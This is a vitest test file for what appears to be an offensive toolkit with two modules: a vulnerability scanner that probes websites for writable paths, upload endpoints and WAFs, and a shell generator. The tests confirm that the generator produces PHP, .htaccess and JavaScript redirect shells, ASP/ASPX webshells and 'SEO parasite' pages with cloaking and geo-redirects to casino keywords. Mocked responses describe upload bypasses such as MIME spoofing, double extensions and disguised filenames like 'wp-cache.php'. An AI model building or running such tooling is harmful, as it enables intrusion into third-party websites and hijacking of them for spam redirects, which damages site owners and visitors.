/**
 * Tests for: AI Vuln Analyzer & AI Shell Generator
 * These tests use the real modules (not mocked) to verify actual logic.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";

// Mock fetch globally
const mockFetch = vi.fn();
global.fetch = mockFetch as any;

// Mock the LLM module
vi.mock("./_core/llm", () => ({
  invokeLLM: vi.fn().mockResolvedValue({
    choices: [{
      message: {
        content: JSON.stringify({
          vectors: [
            {
              id: "vec_1",
              name: "WordPress Upload Bypass",
              method: "POST",
              targetPath: "/wp-content/uploads/",
              successProbability: 75,
              shellType: "php",
              technique: "MIME type bypass",
              payloadType: "php_redirect",
              riskLevel: 3,
              aiReasoning: "WordPress upload directory is writable",
            },
          ],
          analysis: "Target is vulnerable to file upload attacks",
          shell_code: "<?php header('Location: https://redirect.com'); ?>",
          shell_type: "redirect_php",
          bypass_techniques: ["MIME bypass", "double extension"],
          filename: "wp-cache.php",
        }),
      },
    }],
  }),
}));

// Mock env
vi.mock("./_core/env", () => ({
  ENV: {
    shodanApiKey: "test-key",
    builtInForgeApiUrl: "https://api.test.com",
    builtInForgeApiKey: "test-forge-key",
  },
}));

// ═══════════════════════════════════════════════════════
//  AI Vuln Analyzer Tests
// ═══════════════════════════════════════════════════════

describe("AI Vuln Analyzer", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockFetch.mockReset();
  });

  it("should export fullVulnScan function", async () => {
    const mod = await import("./ai-vuln-analyzer");
    expect(typeof mod.fullVulnScan).toBe("function");
  });

  it("should export type interfaces", async () => {
    const mod = await import("./ai-vuln-analyzer");
    expect(mod).toBeDefined();
  });

  it("should return valid VulnScanResult structure", async () => {
    mockFetch.mockImplementation((url: string | URL | Request) => {
      const urlStr = typeof url === "string" ? url : url.toString();

      if (urlStr.includes("dns.google")) {
        return Promise.resolve({
          ok: true,
          json: () => Promise.resolve({ Answer: [{ data: "1.2.3.4" }] }),
        });
      }

      return Promise.resolve({
        ok: true,
        status: 200,
        statusText: "OK",
        headers: new Map([
          ["server", "Apache/2.4.41 (Ubuntu)"],
          ["x-powered-by", "PHP/7.4.3"],
          ["content-type", "text/html"],
        ]),
        text: () => Promise.resolve("<html><head><meta name='generator' content='WordPress 6.0'></head><body>Hello</body></html>"),
        json: () => Promise.resolve({}),
      });
    });

    const { fullVulnScan } = await import("./ai-vuln-analyzer");
    const result = await fullVulnScan("example.com", () => {});

    expect(result).toBeDefined();
    expect(result.target).toContain("example.com");
    expect(result.serverInfo).toBeDefined();
    expect(typeof result.serverInfo.server).toBe("string");
    expect(typeof result.serverInfo.ip).toBe("string");
    expect(typeof result.serverInfo.ssl).toBe("boolean");
    expect(result.cms).toBeDefined();
    expect(typeof result.cms.type).toBe("string");
    expect(Array.isArray(result.writablePaths)).toBe(true);
    expect(Array.isArray(result.uploadEndpoints)).toBe(true);
    expect(Array.isArray(result.exposedPanels)).toBe(true);
    expect(Array.isArray(result.misconfigurations)).toBe(true);
    expect(Array.isArray(result.attackVectors)).toBe(true);
    expect(typeof result.aiAnalysis).toBe("string");
    expect(typeof result.scanDuration).toBe("number");
    expect(typeof result.timestamp).toBe("number");
  }, 30000);

  it("should handle network errors gracefully during scan", async () => {
    mockFetch.mockRejectedValue(new Error("Network error"));

    const { fullVulnScan } = await import("./ai-vuln-analyzer");
    // Use AbortController with short timeout to prevent proxy fallback from hanging
    const abort = new AbortController();
    setTimeout(() => abort.abort(), 15000);
    const result = await fullVulnScan("unreachable.com", () => {}, abort.signal);

    expect(result).toBeDefined();
    expect(result.target).toContain("unreachable.com");
    expect(result.serverInfo).toBeDefined();
    expect(result.cms).toBeDefined();
  }, 30000);

  it("should detect WAF from headers", async () => {
    mockFetch.mockImplementation((url: string | URL | Request) => {
      const urlStr = typeof url === "string" ? url : url.toString();
      if (urlStr.includes("dns.google")) {
        return Promise.resolve({
          ok: true,
          json: () => Promise.resolve({ Answer: [{ data: "1.2.3.4" }] }),
        });
      }
      return Promise.resolve({
        ok: true,
        status: 200,
        statusText: "OK",
        headers: new Map([
          ["server", "cloudflare"],
          ["cf-ray", "abc123"],
          ["cf-cache-status", "HIT"],
        ]),
        text: () => Promise.resolve("<html><body>Protected</body></html>"),
        json: () => Promise.resolve({}),
      });
    });

    const { fullVulnScan } = await import("./ai-vuln-analyzer");
    const result = await fullVulnScan("protected-site.com", () => {});

    expect(result.serverInfo.waf).toBe("cloudflare");
    expect(result.serverInfo.cdn).toBe("cloudflare");
  }, 30000);
});

// ═══════════════════════════════════════════════════════
//  AI Shell Generator Tests
// ═══════════════════════════════════════════════════════

describe("AI Shell Generator", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockFetch.mockReset();
  });

  it("should export generateShellsForTarget function", async () => {
    const mod = await import("./ai-shell-generator");
    expect(typeof mod.generateShellsForTarget).toBe("function");
  });

  it("should export pickBestShell function", async () => {
    const mod = await import("./ai-shell-generator");
    expect(typeof mod.pickBestShell).toBe("function");
  });

  it("should generate shells for a Linux/Apache target", async () => {
    const { generateShellsForTarget } = await import("./ai-shell-generator");

    const mockVulnScan = {
      target: "https://example.com",
      serverInfo: {
        ip: "1.2.3.4",
        server: "Apache/2.4.41",
        poweredBy: "PHP/7.4",
        os: "linux",
        phpVersion: "7.4",
        headers: {},
        waf: null,
        cdn: null,
        ssl: true,
        httpMethods: ["GET", "POST"],
      },
      cms: {
        type: "wordpress" as const,
        version: "6.0",
        plugins: [],
        themes: [],
        vulnerableComponents: [],
        adminUrl: "",
        loginUrl: "",
        apiEndpoints: [],
      },
      writablePaths: [],
      uploadEndpoints: [],
      exposedPanels: [],
      misconfigurations: [],
      attackVectors: [],
      aiAnalysis: "",
      scanDuration: 0,
      timestamp: Date.now(),
    };

    const config = {
      redirectUrl: "https://my-site.com",
      seoKeywords: ["casino", "slots"],
      targetVectors: [],
      serverInfo: mockVulnScan.serverInfo,
      cms: mockVulnScan.cms,
      cloaking: true,
      geoRedirect: true,
      parasiteContent: "medium" as const,
    };

    const shells = await generateShellsForTarget(mockVulnScan as any, config, () => {});

    expect(Array.isArray(shells)).toBe(true);
    expect(shells.length).toBeGreaterThan(0);

    // Should have PHP redirect shells
    const phpShells = shells.filter(s => s.type === "redirect_php");
    expect(phpShells.length).toBeGreaterThan(0);

    // Should have .htaccess for Apache (not nginx)
    const htaccessShells = shells.filter(s => s.type === "redirect_htaccess");
    expect(htaccessShells.length).toBeGreaterThan(0);

    // Should have JS redirect
    const jsShells = shells.filter(s => s.type === "redirect_js");
    expect(jsShells.length).toBeGreaterThan(0);

    // Should have SEO parasite
    const parasiteShells = shells.filter(s => s.type === "seo_parasite");
    expect(parasiteShells.length).toBeGreaterThan(0);

    // Each shell should have required fields
    for (const shell of shells) {
      expect(shell.id).toBeDefined();
      expect(shell.type).toBeDefined();
      expect(shell.filename).toBeDefined();
      expect(shell.content).toBeDefined();
      expect(shell.contentType).toBeDefined();
      expect(shell.redirectUrl).toBe("https://my-site.com");
    }
  });

  it("should NOT generate .htaccess for nginx servers", async () => {
    const { generateShellsForTarget } = await import("./ai-shell-generator");

    const mockVulnScan = {
      target: "https://nginx-site.com",
      serverInfo: {
        ip: "1.2.3.4",
        server: "nginx/1.18.0",
        poweredBy: "PHP/8.1",
        os: "linux",
        phpVersion: "8.1",
        headers: {},
        waf: null,
        cdn: null,
        ssl: true,
        httpMethods: ["GET", "POST"],
      },
      cms: {
        type: "custom" as const,
        version: "",
        plugins: [],
        themes: [],
        vulnerableComponents: [],
        adminUrl: "",
        loginUrl: "",
        apiEndpoints: [],
      },
      writablePaths: [],
      uploadEndpoints: [],
      exposedPanels: [],
      misconfigurations: [],
      attackVectors: [],
      aiAnalysis: "",
      scanDuration: 0,
      timestamp: Date.now(),
    };

    const config = {
      redirectUrl: "https://my-site.com",
      seoKeywords: ["test"],
      targetVectors: [],
      serverInfo: mockVulnScan.serverInfo,
      cms: mockVulnScan.cms,
    };

    const shells = await generateShellsForTarget(mockVulnScan as any, config, () => {});

    const htaccessShells = shells.filter(s => s.type === "redirect_htaccess");
    expect(htaccessShells.length).toBe(0);
  });

  it("should generate ASP/ASPX shells for IIS/Windows servers", async () => {
    const { generateShellsForTarget } = await import("./ai-shell-generator");

    const mockVulnScan = {
      target: "https://iis-site.com",
      serverInfo: {
        ip: "1.2.3.4",
        server: "Microsoft-IIS/10.0",
        poweredBy: "ASP.NET",
        os: "windows",
        phpVersion: "",
        headers: {},
        waf: null,
        cdn: null,
        ssl: true,
        httpMethods: ["GET", "POST"],
      },
      cms: {
        type: "custom" as const,
        version: "",
        plugins: [],
        themes: [],
        vulnerableComponents: [],
        adminUrl: "",
        loginUrl: "",
        apiEndpoints: [],
      },
      writablePaths: [],
      uploadEndpoints: [],
      exposedPanels: [],
      misconfigurations: [],
      attackVectors: [],
      aiAnalysis: "",
      scanDuration: 0,
      timestamp: Date.now(),
    };

    const config = {
      redirectUrl: "https://my-site.com",
      seoKeywords: ["test"],
      targetVectors: [],
      serverInfo: mockVulnScan.serverInfo,
      cms: mockVulnScan.cms,
    };

    const shells = await generateShellsForTarget(mockVulnScan as any, config, () => {});

    // Should have ASP or ASPX shells for Windows/IIS
    const aspShells = shells.filter(s =>
      s.type === "webshell_asp" || s.type === "webshell_aspx"
    );
    expect(aspShells.length).toBeGreaterThan(0);
  });

  it("pickBestShell should match shell type to vector shellType", async () => {
    const { pickBestShell } = await import("./ai-shell-generator");

    const shells = [
      { id: "php_1", type: "redirect_php" as const, filename: "test.php", content: "<?php ?>", contentType: "text/plain", description: "", targetVector: "", bypassTechniques: [], redirectUrl: "", seoKeywords: [], verificationMethod: "" },
      { id: "htaccess_1", type: "redirect_htaccess" as const, filename: ".htaccess", content: "RewriteRule", contentType: "text/plain", description: "", targetVector: "", bypassTechniques: [], redirectUrl: "", seoKeywords: [], verificationMethod: "" },
      { id: "js_1", type: "redirect_js" as const, filename: "test.js", content: "document.location", contentType: "text/javascript", description: "", targetVector: "", bypassTechniques: [], redirectUrl: "", seoKeywords: [], verificationMethod: "" },
    ];

    // Test PHP vector
    const phpVector = {
      id: "vec_1",
      name: "Upload",
      method: "POST",
      targetPath: "/uploads/",
      successProbability: 80,
      shellType: "php" as const,
      technique: "direct",
      payloadType: "php_redirect",
      riskLevel: 3,
      aiReasoning: "test",
    };
    const phpBest = pickBestShell(shells, phpVector);
    expect(phpBest.type).toContain("php");

    // Test htaccess vector
    const htaccessVector = {
      ...phpVector,
      id: "vec_2",
      shellType: "htaccess" as const,
    };
    const htBest = pickBestShell(shells, htaccessVector);
    expect(htBest.type).toBe("redirect_htaccess");

    // Test HTML/JS vector
    const htmlVector = {
      ...phpVector,
      id: "vec_3",
      shellType: "html" as const,
    };
    const htmlBest = pickBestShell(shells, htmlVector);
    expect(htmlBest.type === "redirect_js" || htmlBest.type === "redirect_html").toBe(true);
  });

  it("pickBestShell should fallback to PHP shell when no match", async () => {
    const { pickBestShell } = await import("./ai-shell-generator");

    const shells = [
      { id: "php_1", type: "redirect_php" as const, filename: "test.php", content: "<?php ?>", contentType: "text/plain", description: "", targetVector: "", bypassTechniques: [], redirectUrl: "", seoKeywords: [], verificationMethod: "" },
    ];

    const jspVector = {
      id: "vec_3",
      name: "JSP Upload",
      method: "POST",
      targetPath: "/upload",
      successProbability: 30,
      shellType: "jsp" as const,
      technique: "direct",
      payloadType: "jsp",
      riskLevel: 4,
      aiReasoning: "test",
    };

    const best = pickBestShell(shells, jspVector);
    expect(best.type).toBe("redirect_php"); // Fallback
  });

  it("pickBestShell should prefer AI-generated shells when available", async () => {
    const { pickBestShell } = await import("./ai-shell-generator");

    const shells = [
      { id: "std_1", type: "redirect_php" as const, filename: "test.php", content: "<?php ?>", contentType: "text/plain", description: "", targetVector: "", bypassTechniques: [], redirectUrl: "", seoKeywords: [], verificationMethod: "" },
      { id: "ai_custom_1", type: "redirect_php" as const, filename: "ai.php", content: "<?php ?>", contentType: "text/plain", description: "", targetVector: "", bypassTechniques: [], redirectUrl: "", seoKeywords: [], verificationMethod: "" },
    ];

    const vector = {
      id: "vec_1",
      name: "Upload",
      method: "POST",
      targetPath: "/uploads/",
      successProbability: 80,
      shellType: "php" as const,
      technique: "direct",
      payloadType: "php_redirect",
      riskLevel: 3,
      aiReasoning: "test",
    };

    const best = pickBestShell(shells, vector);
    // Should prefer AI-generated (id starts with "ai_")
    expect(best.id).toBe("ai_custom_1");
  });
});
